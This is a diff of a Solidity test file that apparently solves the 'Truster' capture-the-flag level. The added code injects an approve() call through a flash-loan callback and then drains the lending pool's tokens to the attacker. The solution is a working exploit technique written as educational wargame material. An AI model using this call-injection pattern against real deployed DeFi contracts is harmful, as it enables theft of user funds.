@@ -37,10 +37,17 @@ contract Truster is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
+    function testExploitTruster() public {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", attacker, type(uint256).max);
+        trusterLenderPool.flashLoan(0, attacker, address(dvt), data);
+
+        dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
